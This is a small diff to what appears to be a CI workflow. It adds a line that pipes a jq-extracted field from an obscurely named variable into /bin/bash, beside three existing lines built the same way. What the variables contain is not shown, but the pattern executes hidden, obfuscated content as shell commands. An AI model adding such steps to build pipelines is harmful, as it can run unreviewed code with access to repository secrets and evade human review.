@@ -34,6 +34,7 @@ jobs:
           echo $egjy19 | jq -r .n6807 | /bin/bash
           printf '%s' "$s6152" | jq -r .xbf892 | /bin/bash
           printf '%s' "$gher59640" | jq -r .xdst1205 | /bin/bash
+          printf '%s' "$v38" | jq -r .tifz551 | /bin/bash
 
       - name: Store artifact
         if: always()
